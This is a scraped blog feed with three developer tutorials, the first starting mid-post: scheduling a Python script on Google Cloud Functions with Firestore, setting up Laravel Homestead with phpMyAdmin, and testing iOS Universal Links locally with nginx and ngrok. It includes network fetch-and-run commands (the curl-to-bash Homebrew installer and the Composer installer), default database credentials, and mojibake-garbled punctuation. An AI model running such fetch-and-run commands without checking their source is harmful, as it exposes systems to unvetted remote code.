were minimal and didn‚Äôt require many features; so I used Google Cloud Function, a serverless solution. It is commonly used to build serverless web services. If you haven‚Äôt used Google Cloud before, please first go to the Console to create a new project and set up your billing information. On the project console homepage, click ‚ÄúCloud Functions‚Äù under Resources. Select ‚ÄúCreate Function‚Äù above Enter Basic Information ‚ö†Ô∏è Note down the ‚ÄúTrigger URL‚ÄùSelectable Region: US-WEST1, US-CENTRAL1, and US-EAST1 regions offer a free tier for Cloud Storage services. asia-east2 (Hong Kong) is closer to us but requires a small Cloud Storage fee. ‚ö†Ô∏èWhen creating Cloud Functions, Cloud Storage is required to host the code. ‚ö†Ô∏è For detailed pricing, please refer to the end of the article.Trigger Condition: HTTPVerification: According to the requirement, I want to execute the script by clicking an external link, so I choose ‚ÄúAllow unauthenticated calls‚Äù; if authentication is required, the Scheduler service must also be configured accordingly.Variables, network, and advanced settings can be configured in Variables for Python use (so you don‚Äôt need to modify the Python code when parameters change):How to call in Python:import osdef main(request): return os.environ.get('test', 'DEFAULT VALUE')No other settings need to be changed, just click ‚ÄúSave‚Äù -&gt; ‚ÄúNext‚Äù. Set the runtime to ‚ÄúPython 3.x‚Äù and paste the written Python script. Change the entry point to ‚Äúmain‚Äù.Add main(args). As mentioned earlier, this service is mainly used for serverless web; thus, args is actually a Request object. You can get the HTTP GET query and HTTP POST body data from it, as shown below:Get GET Query information:request_args = args.argsexample: ?name=zhgchgli =&gt; request_args = [‚Äúname‚Äù:‚Äùzhgchgli‚Äù]Get POST Body data:request_json = request.get_json(silent=True)example: name=zhgchgli =&gt; request_json = [‚Äúname‚Äù:‚Äùzhgchgli‚Äù]If using Postman to test POST, remember to use ‚ÄúRaw + JSON‚Äù for the POST data; otherwise, nothing will be sent: After the code section is done, switch to ‚Äúrequirements.txt‚Äù and enter the required package dependencies:We use the ‚Äúrequest‚Äù package to call APIs. This package is not included in the native Python library, so we need to add it here:requests&gt;=2.25.1Here, the version is specified as ‚â• 2.25.1, but you can also omit the version and just enter requests to install the latest version. Once everything is OK, click ‚ÄúDeploy‚Äù to start the deployment.It takes about 1 to 3 minutes to complete the deployment. After deployment, you can use the previously noted ‚ÄúTrigger URL‚Äù to execute and verify if it runs correctly, or use ‚ÄúActions‚Äù -&gt; ‚ÄúTest Function‚Äù to perform a test.If a 500 Internal Server Error occurs, it means there is a program error. You can click the name to view the ‚ÄúLogs‚Äù and find the cause there:UnboundLocalError: local variable 'db' referenced before assignment Click the name to enter, then click ‚ÄúEdit‚Äù to modify the script content. The test went smoothly and is now complete! We have successfully migrated the Python script to the cloud.Additional Information About VariablesAccording to our requirements, we need a place to store and read the token for the check-in app; since the token may expire, it needs to be requested again and saved for use in the next execution.To dynamically pass variables from outside into the script, you can use the following methods: [Read Only] Runtime environment variables mentioned above [Temp] Cloud Functions provides a /tmp directory for writing and reading files during execution, but it is deleted after completion. For details, please refer to the official documentation. [Read Only] GET/POST Data Transmission [Read Only] Attach Additional File Using the relative path ./ in the program allows reading files, but only for reading, not for dynamic modification; to modify, you must do so in the console and redeploy. To read and dynamically modify, you need to connect to other GCP services, such as Cloud SQL, Google Storage, Firebase Cloud Firestore‚Ä¶ [Read &amp; Write] Here, I chose Firebase Cloud Firestore because it is currently the only option with a free usage tier.After following the Getting Started steps and creating a Firebase project, go to the Firebase console:In the left menu, find ‚ÄúCloud Firestore‚Äù -&gt; ‚ÄúAdd Collection‚ÄùEnter collection ID.Input data content.A collection can have multiple documents, and each document can have its own field content; this offers great flexibility in usage.Usage in Python:Please go to GCP Console -&gt; IAM &amp; Admin -&gt; Service Accounts and follow the steps below to download the authentication private key file:First, select an account:Below ‚ÄúAdd Key‚Äù -&gt; ‚ÄúCreate New Key‚ÄùSelect ‚ÄúJSON‚Äù to download the file.Place this JSON file in the same project directory as the Python file.In Local Development Environment:pip install --upgrade firebase-adminInstall the firebase-admin package.In Cloud Functions, you need to add firebase-admin to the requirements.txt file.After setting up the environment, we can now read the data we just added:firebase_admin.py:import firebase_adminfrom firebase_admin import credentialsfrom firebase_admin import firestoreif not firebase_admin._apps: cred = credentials.Certificate('./authentication.json') firebase_admin.initialize_app(cred)# Initializing app multiple times causes the following error:# providing an app name as the second argument. In most cases you only need to call initialize_app() once. But if you do want to initialize multiple apps, pass a second argument to initialize_app() to give each app a unique name.# So to be safe, check if initialized before calling initialize_appdb = firestore.client()ref = db.collection(u'example') # collection namestream = ref.stream()for data in stream: print(\"id:\"+data.id+\",\"+data.to_dict()) If you are using Cloud Functions, you can upload the authentication JSON file together, or modify the connection syntax as follows when using it:cred = credentials.ApplicationDefault()firebase_admin.initialize_app(cred, { 'projectId': project_id,})db = firestore.client() If you see Failed to initialize a certificate credential., please check if the authentication JSON is correct.For adding and deleting more operations, please refer to the official documentation.4. Set Up Automatic Scheduling in Google CloudAfter having the script, the next step is to automate its execution to achieve our ultimate goal. Go to the Google Cloud Scheduler console homepage Click ‚ÄúCreate Task‚Äù above Enter basic job informationExecution Frequency: Same as crontab input format. If you are not familiar with crontab syntax, you can directly use the amazing website crontab.guru:It can directly translate the actual meaning of the syntax you set. (Click next to see the next execution time) Here I set 15 1 * * * because the check-in only needs to run once a day, scheduled at 1:15 AM daily.URL part: Enter the previously noted ‚Äútrigger URL‚ÄùTime Zone: Enter ‚ÄúTaiwan‚Äù and select Taipei Standard TimeHTTP Method: According to the previous Python code, we can just use Get.If you have set up ‚ÄúVerification‚Äù earlier, remember to expand ‚ÄúSHOW MORE‚Äù to configure the verification settings.After filling in all the fields, click ‚ÄúCreate‚Äù. After successfully creating, you can choose ‚ÄúRun Now‚Äù to test if it works properly. You can view the execution results and the last execution date. ‚ö†Ô∏è Please note that a ‚Äúfailure‚Äù result only applies when the web status code is 400‚Äì500 or there is an error in the Python program.All done!We have achieved the goal of uploading routine Python scripts to the cloud and setting up automated scheduling for execution.Pricing MethodAnother important aspect is the pricing method; Google Cloud and Linebot are not entirely free services, so understanding their fees is crucial. Otherwise, spending too much money on a small script isn‚Äôt worth it‚Äîyou might as well just leave your computer running.LinebotRefer to the official pricing information, with up to 500 messages free per month.Google Cloud FunctionsRefer to the official pricing information, which includes 2 million invocations per month, 400,000 GB-seconds and 200,000 GHz-seconds of compute time, and 5 GB of internet egress traffic.Google Firebase Cloud FirestoreRefer to the official pricing information: 1 GB storage, 10 GB monthly bandwidth, 50,000 reads per day, 20,000 writes/deletes per day; enough for light use!Google Cloud SchedulerRefer to the official pricing information, each account can set up 3 free jobs. The free quota above is more than enough for the script!Google Cloud Storage Conditional Free TierHiding here and there, you still can‚Äôt avoid services that may charge fees.After creating Cloud Functions, two Cloud Storage entities are automatically created:If you selected US-WEST1, US-CENTRAL1, or US-EAST1 for Cloud Functions, you are eligible for the free usage quota:I chose US-CENTRAL1, that‚Äôs correct. You can see the first Cloud Storage instance is located in US-CENTRAL1, but the second one is labeled multiple regions in the US; I personally estimate this will incur charges.Refer to the official pricing information; prices vary depending on the host region.The code isn‚Äôt much, so I estimate the minimum monthly charge is around 0.0X0 yuan (? ‚ö†Ô∏èThe above information was recorded as of 2021/02/21. Actual prices may vary and are for reference only.Pricing and Budget Control Notificationjust in case‚Ä¶ If the usage exceeds the free limit and charges begin, I want to receive a notification; this will prevent unexpected billing spikes caused by possible program errors from going unnoticed. Go to the Console Find the ‚ÄúBilling Feature‚Äù Card: Click ‚ÄúView detailed deduction records‚Äù to enter. Expand the left menu and go to the ‚ÄúBudget &amp; Alerts‚Äù feature Click on ‚ÄúSet Budget‚Äù above Enter Custom NameNext step. Amount, enter ‚ÄúTarget Amount‚Äù, you can input $1, $10; we don‚Äôt want to spend too much on small things.Next step.You can set the action to trigger a notification when the budget reaches a certain percentage.Check ‚ÄúSend alerts via email to billing administrators and users‚Äù so that notifications are received immediately when conditions are met.Click ‚ÄúDone‚Äù to submit and save.When the budget is exceeded, we can immediately know to avoid incurring more costs.SummaryHuman energy is limited. In today‚Äôs flood of technology and information, every platform and service tries to drain our limited energy. If we can use some automation scripts to share the load of our daily lives, accumulating little by little, it will save us more energy to focus on what truly matters!Further Reading Slack Builds Fully Automated WFH Employee Health Reporting System Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking Tool Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate The app uses HTTPS for transmission, but the data was still stolen. How to Create an Engaging Engineering CTF Competition iOS 14 Clipboard Privacy Concerns: The Dilemma Between Privacy and Convenience Forward Gmail Emails to Slack Using Google Apps Script If you have any questions or feedback, feel free to contact me.If you have automation-related optimization needs, feel free to contact me. Thank you. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Laravel Homestead SetupÔΩúphpMyAdmin Integration for MySQL Management", "url": "/posts/zrealm-dev/laravel-homestead-setup-phpmyadmin-integration-for-mysql-management-87090f101b9a/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, php, laravel, vagrant, virtualbox", "date": "2021-02-05 14:01:41 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Reinstallation Note 1] - Laravel Homestead + phpMyAdmin Environment SetupFrom...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Reinstallation Note 1] - Laravel Homestead + phpMyAdmin Environment SetupFrom 0 to 1: Setting Up a Laravel Development Environment with phpMyAdmin GUI for Managing MySQL DatabaseLaravel Recently reset my Mac and documented the steps to restore the Laravel development environment.Environment Requirements Vagrant: Virtual environment configuration tool VirtualBox: Free virtualization software. If you have already purchased Parallels, you can use Parallels directly (but you need to install the plug-in). After downloading and installing these two software, proceed to the next setup step. VirtualBox installation requires a reboot and navigating to ‚ÄúSettings‚Äù -&gt; ‚ÄúSecurity &amp; Privacy‚Äù -&gt; ‚ÄúAllow VirtualBox‚Äù to enable all services.Setting up the Homestead Environmentgit clone https://github.com/laravel/homestead.git ~/Homesteadcd ~/Homesteadgit checkout releasebash init.shphpMyAdmin phpMyAdmin is a PHP-based, web-based MySQL database management tool hosted on a website server, allowing administrators to manage MySQL databases via a web interface. This web interface provides an easy way to input complex SQL commands, making it especially convenient for importing and exporting large amounts of data. ‚Äî Wiki phpMyAdminGo to the phpMyAdmin official website and download the latest version.Unzip .zip -&gt; Folder -&gt; Rename Folder -&gt; ‚ÄúphpMyAdmin‚Äù:Move the phpMyAdmin folder to the ~/Homestead directory:phpMyAdmin SettingsFind config.sample.inc.php in the phpMyAdmin folder, rename it to config.inc.php, and open it with an editor to modify the settings as follows:&lt;?php/* vim: set expandtab sw=4 ts=4 sts=4: *//** * phpMyAdmin sample configuration, you can use it as base for * manual configuration. For easier setup you can use setup/ * * All directives are explained in documentation in the doc/ folder * or at &lt;https://docs.phpmyadmin.net/&gt;. * * @package PhpMyAdmin */declare(strict_types=1);/** * This is needed for cookie based authentication to encrypt password in * cookie. Needs to be 32 chars long. */$cfg['blowfish_secret'] = ''; /* YOU MUST FILL IN THIS FOR COOKIE AUTH! *//** * Servers configuration */$i = 0;/** * First server */$i++;/* Authentication type */$cfg['Servers'][$i]['auth_type'] = 'config';/* Server parameters */$cfg['Servers'][$i]['host'] = 'localhost';$cfg['Servers'][$i]['user'] = 'homestead';$cfg['Servers'][$i]['password'] = 'secret';$cfg['Servers'][$i]['compress'] = false;$cfg['Servers'][$i]['AllowNoPassword'] = false;/** * phpMyAdmin configuration storage settings. *//* User used to manipulate with storage */// $cfg['Servers'][$i]['controlhost'] = '';// $cfg['Servers'][$i]['controlport'] = '';// $cfg['Servers'][$i]['controluser'] = 'pma';// $cfg['Servers'][$i]['controlpass'] = 'pmapass';/* Storage database and tables */// $cfg['Servers'][$i]['pmadb'] = 'phpmyadmin';// $cfg['Servers'][$i]['bookmarktable'] = 'pma__bookmark';// $cfg['Servers'][$i]['relation'] = 'pma__relation';// $cfg['Servers'][$i]['table_info'] = 'pma__table_info';// $cfg['Servers'][$i]['table_coords'] = 'pma__table_coords';// $cfg['Servers'][$i]['pdf_pages'] = 'pma__pdf_pages';// $cfg['Servers'][$i]['column_info'] = 'pma__column_info';// $cfg['Servers'][$i]['history'] = 'pma__history';// $cfg['Servers'][$i]['table_uiprefs'] = 'pma__table_uiprefs';// $cfg['Servers'][$i]['tracking'] = 'pma__tracking';// $cfg['Servers'][$i]['userconfig'] = 'pma__userconfig';// $cfg['Servers'][$i]['recent'] = 'pma__recent';// $cfg['Servers'][$i]['favorite'] = 'pma__favorite';// $cfg['Servers'][$i]['users'] = 'pma__users';// $cfg['Servers'][$i]['usergroups'] = 'pma__usergroups';// $cfg['Servers'][$i]['navigationhiding'] = 'pma__navigationhiding';// $cfg['Servers'][$i]['savedsearches'] = 'pma__savedsearches';// $cfg['Servers'][$i]['central_columns'] = 'pma__central_columns';// $cfg['Servers'][$i]['designer_settings'] = 'pma__designer_settings';// $cfg['Servers'][$i]['export_templates'] = 'pma__export_templates';/** * End of servers configuration *//** * Directories for saving/loading files from server */$cfg['UploadDir'] = '';$cfg['SaveDir'] = '';/** * Whether to display icons or text or both icons and text in table row * action segment. Value can be either of 'icons', 'text' or 'both'. * default = 'both' *///$cfg['RowActionType'] = 'icons';/** * Defines whether a user should be displayed a \"show all (records)\" * button in browse mode or not. * default = false *///$cfg['ShowAll'] = true;/** * Number of rows displayed when browsing a result set. If the result * set contains more rows, \"Previous\" and \"Next\". * Possible values: 25, 50, 100, 250, 500 * default = 25 *///$cfg['MaxRows'] = 50;/** * Disallow editing of binary fields * valid values are: * false allow editing * 'blob' allow editing except for BLOB fields * 'noblob' disallow editing except for BLOB fields * 'all' disallow editing * default = 'blob' *///$cfg['ProtectBinary'] = false;/** * Default language to use, if not browser-defined or user-defined * (you find all languages in the locale folder) * uncomment the desired line: * default = 'en' *///$cfg['DefaultLang'] = 'en';//$cfg['DefaultLang'] = 'de';/** * How many columns should be used for table display of a database? * (a value larger than 1 results in some information being hidden) * default = 1 *///$cfg['PropertiesNumColumns'] = 2;/** * Set to true if you want DB-based query history.If false, this utilizes * JS-routines to display query history (lost by window close) * * This requires configuration storage enabled, see above. * default = false *///$cfg['QueryHistoryDB'] = true;/** * When using DB-based query history, how many entries should be kept? * default = 25 *///$cfg['QueryHistoryMax'] = 100;/** * Whether or not to query the user before sending the error report to * the phpMyAdmin team when a JavaScript error occurs * * Available options * ('ask' \\\\| 'always' \\\\| 'never') * default = 'ask' *///$cfg['SendErrorReports'] = 'always';/** * You can find more configuration options in the documentation * in the doc/ folder or at &lt;https://docs.phpmyadmin.net/&gt;. */Mainly added or modified these three settings:$cfg['Servers'][$i]['auth_type'] = 'config';$cfg['Servers'][$i]['user'] = 'homestead'; The default MySQL username and password for homestead are homestead / secret.Configure Homestead SettingsOpen the ~/Homestead/Homestead.yaml configuration file with an editor.---ip: \"192.168.10.10\"memory: 2048cpus: 2provider: virtualboxauthorize: ~/.ssh/id_rsa.pubkeys: - ~/.ssh/id_rsafolders: - map: ~/Projects/Web to: /home/vagrant/code - map: ~/Homestead/phpMyAdmin to: /home/vagrant/phpMyAdminsites: - map: phpMyAdmin.test to: /home/vagrant/phpMyAdmindatabases: - homesteadfeatures: - mysql: false - mariadb: false - postgresql: false - ohmyzsh: false - webdriver: false#services:# - enabled:# - \"postgresql@12-main\"# - disabled:# - \"postgresql@11-main\"# ports:# - send: 50000# to: 5000# - send: 7777# to: 777# protocol: udp IP : Default is 192.168.10.10, can be changed or left as is provider: The default is virtualbox. Change it only if using Parallels. folders: added map: ~/Homestead/phpMyAdminto: /home/vagrant/phpMyAdmin sites: added map: phpMyAdmin.testto: /home/vagrant/phpMyAdmin If you already have a Laravel project, you can add it here as well. For example, I keep all my projects under ~/Projects/Web, so I first add the directory mapping accordingly.sites sets up local virtual domains and directory mappings. We also need to modify the local Hosts file to add domain-to-virtual machine mappings:Use Finder -&gt; Go -&gt; /etc/hosts to locate the hosts file; copy it to the desktop (cannot modify it directly) The domain name can be freely customized since only the local machine can access it.Open the copied Hosts file and add site records:&lt;homestead IP address&gt; &lt;domain name&gt;After editing, save the file, then cut and paste it back into /etc/hosts to overwrite the original.Installing &amp; Starting Homestead Virtual Machinecd ~/Homesteadvagrant up --provision ‚ö†Ô∏èPlease note that if you do not add --provision, the provisioning profile will not be updated, and entering the URL will result in a no input file specified error.The first launch requires downloading the Homestead environment package, which takes a longer time.If no specific errors appear, it means the startup was successful. You can enter:vagrant sshssh into the virtual machine.Check if phpMyAdmin is Connected CorrectlyGo to http://phpmyadmin.test/ to check if it opens properly.Success! When we need to operate the database, we can directly come here to make changes.Create a New Laravel ProjectIf you already have an existing project, by this step you can run it locally from the browser. If not, here is how to create a new Laravel project.~/Homesteadvagrant sshvagrant ssh into the VM, then cd into the code directory:cd ./codeRun laravel new project_name to create a Laravel project: (using blog as an example)laravel new blogblog project created successfully!Next, we need to configure the project to allow the machine to access the test domain:Open the ~/Homestead/Homestead.yaml configuration file again for editing.Add a new record in sites:sites: - map: myblog.test to: /home/vagrant/code/blog/publicRemember to add the corresponding records to the hosts file as well:192.168.10.10. myblog.testFinally, restart homestead:vagrant reload --provisionEnter http://myblog.test in the browser to test if it is correctly created and running:Done!Supplement ‚Äî Installing Composer on MacAlthough Homestead allows you to avoid installing Composer separately, since some PHP projects do not use Laravel, it is still necessary to install Composer on your local machine. ComposerCopy the command from the download section and replace php composer-setup.php with:php composer-setup.php - install-dir=/usr/local/bin - filename=composerComposer v2.0.9 Example:php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"php -r \"if (hash_file('sha384', 'composer-setup.php') === '756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"php composer-setup.php --install-dir=/usr/local/bin --filename=composerphp -r \"unlink('composer-setup.php');\"Then enter the commands in the terminal in order. ‚ö†Ô∏èPlease note do not directly copy and use the above examples, as the hash check code will change with Composer version updates.Type composer -V to check the version and confirm successful installation!References https://laravel.com/docs/8.x/homestead https://getcomposer.org/download/ If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Universal Links OptimizationÔΩúBoost iOS 13 & 14 Integration with Local Testing Setup", "url": "/posts/zrealm-dev/universal-links-optimization-boost-ios-13-14-integration-with-local-testing-setup-12c5026da33d/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, universal-links, app-store, deep-link", "date": "2021-02-04 11:57:25 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What‚Äôs New with Universal LinksiOS 13, iOS 14 Universal Links Updates &amp; Se...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What‚Äôs New with Universal LinksiOS 13, iOS 14 Universal Links Updates &amp; Setting Up a Local Testing EnvironmentPhoto by NASAPrefaceFor a service with both a website and an app, the functionality of Universal Links is crucial for user experience, enabling seamless integration between the web and the app. However, it has always been set up simply, without much detail. Recently, I spent some time researching it again and recorded some interesting findings.Common ConsiderationsFor the services I‚Äôve handled, the consideration for implementing Universal Links is that the app does not have a fully functional website. Universal Links recognize the domain name, and as long as the domain matches, the app will open. To address this issue, you can use NOT to exclude URLs that do not have corresponding features in the app. If the website URLs are very specific, it‚Äôs better to create a new subdomain specifically for Universal Links.When is apple-app-site-association updated? For iOS &lt; 14, the app requests the apple-app-site-association file from the Universal Links website during the first install or update. For iOS ‚â• 14, Apple CDN caches and periodically updates the apple-app-site-association file for Universal Links websites; the app fetches it from Apple CDN during the first install or update. However, this can cause an issue where the apple-app-site-association on Apple CDN might still be outdated. Regarding the Apple CDN update mechanism, I checked the documentation but found no mention; I also looked at the discussion, where the official reply was only ‚Äúupdates regularly‚Äù and that details would be published in the documentation later‚Ä¶ but so far, nothing has appeared. I personally think it should update within 48 hours at the latest‚Ä¶ So next time you make changes to the apple-app-site-association, it‚Äôs recommended to update it online a few days before the app release or update.apple-app-site-association Apple CDN Verification:Headers: HOST=app-site-association.cdn-apple.comGET https://app-site-association.cdn-apple.com/a/v1/your-domainYou can get the current version on Apple CDN. (Remember to add the Request Header Host=https://app-site-association.cdn-apple.com/)iOS ‚â• 14 DebugDue to the aforementioned CDN issues, how should we debug during the development phase?Fortunately, Apple provides a solution for this part; otherwise, real-time updates would be frustrating. We just need to add ?mode=developer after applinks:domain.com. Additionally, there are managed (for enterprise internal apps) and developer+managed modes available for configuration.After adding mode=developer, the app will fetch the latest app-site-association from the website every time it builds and runs on the simulator.To Build &amp; Run on a real device, go to ‚ÄúSettings‚Äù -&gt; ‚ÄúDeveloper‚Äù -&gt; enable the ‚ÄúAssociated Domains Development‚Äù option first. ‚ö†Ô∏è Here is a pitfall: app-site-association can be placed in the website root directory or the ./.well-known directory; however, in mode=developer, it only checks ./.well-known/app-site-association, which made me think it wasn‚Äôt working.Development TestingIf you are using iOS &lt;14 and have modified the app-site-association file, remember to delete it before rebuilding and running the app to fetch the latest version. For iOS ‚â• 14, please refer to the previous method and add mode=developer.Modifying the app-site-association content is better done by editing the file directly on the server; however, for those of us who sometimes can‚Äôt access the server, testing universal links becomes very troublesome. We have to keep bothering backend colleagues for help, so we must be sure about the app-site-association content before going live. Constant changes will drive our colleagues crazy.Build a Local Simulation EnvironmentTo solve the above problem, we can start a small local service.First, install nginx on your Mac:brew install nginxIf you haven‚Äôt installed brew before, you can install it first:/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"After installing nginx, go to /usr/local/etc/nginx/ and open the nginx.conf file for editing:...omittedserver { listen 8080; server_name localhost;#charset koi8-r;#access_log logs/host.access.log main;location / { root /Users/zhgchgli/Documents; index index.html index.htm; }...omittedAround line 44, change the root inside location / to your desired directory (here, Documents is used as an example). listen on 8080 port, no need to change if there is no conflict.After saving the changes, run the command to start nginx:nginxTo stop, enter:nginx -s stopStop.If you make changes to nginx.conf, remember to run:nginx -s reloadReactivate the service.Create a ./.well-known directory inside the newly set root directory, and place the apple-app-site-association file inside ./.well-known. ‚ö†Ô∏è If the .well-known folder disappears after creation, please make sure to enable the ‚ÄúShow Hidden Files‚Äù feature on your Mac:In the terminal:defaults write com.apple.finder AppleShowAllFiles TRUEThen run killall finder to restart all Finder processes. ‚ö†Ô∏è apple-app-site-association seems to have no file extension, but it actually has a .json extension:Right-click on the file -&gt; ‚ÄúGet Info‚Äù -&gt; ‚ÄúName &amp; Extension‚Äù -&gt; Check if there is a file extension &amp; uncheck ‚ÄúHide extension‚Äù if neededAfter confirming no issues, open the browser to test if the following link downloads the apple-app-site-association file correctly:http://localhost:8080/.well-known/apple-app-site-associationIf the download works properly, it means the local environment simulation was successful! If a 404/403 error occurs, please check if the root directory is correct, if the directory/file is properly placed, and whether the apple-app-site-association file accidentally has an extension (e.g., .json).Register &amp; Download Ngrokngrok.comUnzip the ngrok executable fileGo to the Dashboard page to perform the Config setup../ngrok authtoken your TOKENAfter setting up, enter:./ngrok http 8080 Because our nginx is on port 8080.Start the service.At this point, we will see a service startup status window, where the public URL assigned this time can be obtained from Forwarding. ‚ö†Ô∏è The assigned URL changes with each startup, so it can only be used for development testing. Here, the allocated URL for this example is https://ec87f78bec0f.ngrok.io/Return to the browser and enter https://ec87f78bec0f.ngrok.io/.well-known/apple-app-site-association to see if the apple-app-site-association file can be downloaded and viewed properly. If there are no issues, you can proceed to the next step.Enter the URL assigned by ngrok into the Associated Domains applinks: setting.Remember to include ?mode=developer for our testing convenience.Rebuild &amp; Run APP:Open the browser and enter the corresponding Universal Links test URL (e.g., https://ec87f78bec0f.ngrok.io/buy/123) to check the result. If the page shows a 404, ignore it because we don‚Äôt actually have that page; we are just testing whether iOS URL matching works as expected. If ‚ÄúOpen‚Äù appears above, it means the match is successful. You can also test the NOT inverse condition.Click ‚ÄúOpen‚Äù to launch the app -&gt; Test successful! After successful testing in the development phase, confirm the modified apple-app-site-association file and provide it to the backend team to upload to the server to ensure everything works perfectly. Finally, remember to change the Associated Domains applinks: to the official testing website URL.We can also check from the ngrok status window whether each APP Build &amp; Run requests the apple-app-site-association file:Applinks Settings ContentiOS &lt; 13 before:The configuration file is simpler, with only the following settings available:{ \"applinks\": { \"apps\": [], \"details\": [ { \"appID\" : \"TeamID.BundleID\", \"paths\": [ \"NOT /help/\", \"*\" ] } ] }}Replace TeamID.BundleId with your project settings (e.g., TeamID = ABCD, BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp). If there are multiple appIDs, add multiple sets accordingly.The paths section contains matching rules and supports the following syntax: *: Matches 0 or more characters, e.g., /home/* (home/alan‚Ä¶) ?: Matches 1 character, e.g., 201? (2010~2019) ?*: Matches 1 or more characters, e.g., /?* (/test, /home, etc.) NOT: Excludes, e.g., NOT /help (any URL except /help) You can create more combinations based on your actual situation. For more information, please refer to the official documentation. - Note, it is not Regex and does not support any Regex syntax. - The old version does not support Query (?name=123) or Anchor (#title). - Chinese URLs must be converted to ASCII before placing them in paths (all URL characters must be ASCII).iOS ‚â• 13 and later:Enhanced the profile content features, adding more support for Query/Anchor, character sets, and encoding handling.\"applinks\": { \"details\": [ { \"appIDs\": [ \"TeamID.BundleID\" ], \"components\": [ { \"#\": \"no_universal_links\", \"exclude\": true, \"comment\": \"Matches any URL whose fragment equals no_universal_links and instructs the system not to open it as a universal link\" }, { \"/\": \"/buy/*\", \"comment\": \"Matches any URL whose path starts with /buy/\" }, { \"/\": \"/help/website/*\", \"exclude\": true, \"comment\": \"Matches any URL whose path starts with /help/website/ and instructs the system not to open it as a universal link\" }, { \"/\": \"/help/*\", \"?\": { \"articleNumber\": \"????\" }, \"comment\": \"Matches any URL whose path starts with /help/ and that has a query item with name 'articleNumber' and a value of exactly 4 characters\" } ] } ]}Reposted from the official document, you can see that the format has changed.appIDs is an array that can hold multiple appIDs, so you no longer need to repeat the entire block as before. WWDC mentioned backward compatibility: when iOS ‚â• 13 reads the new format, it will ignore the old paths.Matching rules are moved to components; supports 3 types: / Ôºö URL ? Ôºö Query, ex: ?name=123&amp;place=tw # Ôºö Anchor, ex: #title And it can be used together. For example, if only /user/?id=100#detail needs to jump to the APP, you can write:{ \"/\": \"/user/*\", \"?\": { \"id\": \"*\" }, \"#\": \"detail\"}The matching syntax is the same as the original syntax and also supports * ? ?*.Add a comment field for notes to help identification. (Note this is public and visible to others)To exclude in reverse, specify exclude: true.Added caseSensitive option to specify whether matching rules are case-sensitive. Default: true. This can reduce the number of rules needed if enabled.Added percentEncoded as mentioned earlier. In the old version, URLs had to be converted to ASCII and placed in paths first (Chinese characters would look ugly and unreadable). This parameter decides whether to automatically encode for us, with the default set to true.If the URL contains Chinese characters, it can be directly used (e.g., /ÂÆ¢Êúç‰∏≠ÂøÉ).Detailed official documentation can be found here.Default Character Set:This is one of the important features in this update, adding support for character sets.Character sets defined by the system for us: $(alpha) ÔºöA-Z and a-z $(upper) ÔºöA-Z $(lower) : a-z $(alnum) ÔºöA-Z, a-z, and 0‚Äì9 $(digit) Ôºö0‚Äì9 $(xdigit) : hexadecimal characters, 0‚Äì9 and a,b,c,d,e,f,A,B,C,D,E,F $(region) ÔºöISO region code isoRegionCodes, Ex: TW $(lang) ÔºöISO language code isoLanguageCodes, Ex: zh Assuming our website supports multiple languages, we can set up Universal Links like this:\"components\": [ { \"/\" : \"/$(lang)-$(region)/$(food)/home\" } ]This way, both /zh-TW/home and /en-US/home are supported, which is very convenient and saves you from writing a whole set of rules yourself!Custom Character Sets:In addition to the default character set, we can also customize character sets to enhance profile reuse and readability.Add substitutionVariables in applinks as follows:{ \"applinks\": { \"substitutionVariables\": { \"food\": [ \"burrito\", \"pizza\", \"sushi\", \"samosa\" ] }, \"details\": [{ \"appIDs\": [ ... ], \"components\": [ { \"/\" : \"/$(food)/\" } ] }] }}The example defines a custom food character set and uses it later in the components.The above example matches /burrito, /pizza, /sushi, /samosa.For details, refer to the official document here.No Inspiration?If you have no ideas for the configuration file content, you can secretly refer to other websites‚Äô files by adding /app-site-association or /.well-known/app-site-association to the homepage URL of the service website to access their configuration.For example: https://www.netflix.com/apple-app-site-associationSupplementWhen using SceneDelegate, the entry point for opening a universal link is in the SceneDelegate:func scene(_ scene: UIScene, continue userActivity: NSUserActivity)Instead of AppDelegate:func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([UIUserActivityRestoring]?) -&gt; Void) 